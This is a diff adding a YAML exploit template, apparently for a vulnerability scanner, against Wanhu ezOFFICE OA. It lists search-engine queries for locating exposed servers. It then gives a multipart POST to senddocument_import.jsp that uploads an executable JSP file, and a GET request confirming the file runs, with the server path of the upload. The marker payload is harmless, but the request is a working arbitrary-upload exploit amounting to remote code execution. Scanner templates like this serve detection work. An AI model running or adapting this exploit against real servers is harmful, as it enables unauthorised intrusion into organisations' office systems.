@@ -1,0 +1,53 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="万户网络-ezOFFICE"
+    hunter-query: app.name="万户 Ezoffice OA"
+    quake-query: app:"万户ezOFFICE协同管理平台"
+    zoomeye-query: title:"万户ezOFFICE协同管理平台"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    tips: /defaultroot/upload/loginpage/xx.jsp;fds  |  绝对路径 D:/jboss/jboss-as/server/oa/deploy/defaultroot.war/upload/loginpage/xx.jsp
+    
+name: poc-yaml-wanhu-ezoffice-senddocument_import.jsp-upload
+manual: true
+transport: http
+set:
+    s1: randomInt(10000000, 90000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /defaultroot/modules/govoffice/gov_documentmanager/senddocument_import.jsp;ad?categoryId=null&path=loginpage&mode=add&fileName=null&saveName=null&fileMaxSize=0&fileMaxNum=null&fileType=jsp
+            headers:
+                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{s2}}          
+            body: "------WebKitFormBoundary{{s2}}\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"4ndex.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<% out.println(\"4ra1n\");%>\r\n------WebKitFormBoundary{{s2}}\r\nContent-Disposition: form-data; name=\"continueUpload\"\r\n\r\n0\r\n------WebKitFormBoundary{{s2}}\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\n导　入\r\n------WebKitFormBoundary{{s2}}--"            
+        expression: response.status == 200 && response.body_string.contains("4ndex.jsp")
+
+        output:
+            search: |-
+                "saveName=\"(?P<filename>\\w+.jsp)".bsubmatch(response.body)
+            filename: search["filename"]
+            search1: |-
+                "(?P<newpath>ico.*jsp)".bsubmatch(response.body)
+            newpath: search["newpath"]
+
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /defaultroot/upload/loginpage/{{filename}};fds
+            headers:
+            body:
+        expression: response.status == 200 && response.body_string.contains("4ra1n")
+
+expression: r0() && r1() 
